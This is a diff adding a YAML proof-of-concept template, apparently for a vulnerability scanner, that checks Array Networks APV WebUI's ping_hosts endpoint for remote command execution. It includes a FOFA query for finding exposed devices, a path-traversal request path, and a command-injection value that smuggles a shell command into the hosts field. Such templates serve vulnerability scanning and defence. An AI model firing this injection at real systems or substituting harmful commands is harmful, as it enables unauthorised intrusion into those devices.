@@ -1,0 +1,23 @@
+id: poc-yaml-arraynetworks-apv-webui
+info:
+  name: APV WebUI ping_hosts接口存在任意命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: APV WebUI
+  fofa: app="Array-APV" && title=="Login"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /restapi/../rest/ping_hosts
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '["127.0.0.1| echo `expr {{.t1}} - {{.t2}}` received 2 3 4"]=1
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"receive\\\"\") &&\ncontains(body,\"\
+    \\\"send\\\"\") &&\ncontains(body,t3)\n"
+transport: http
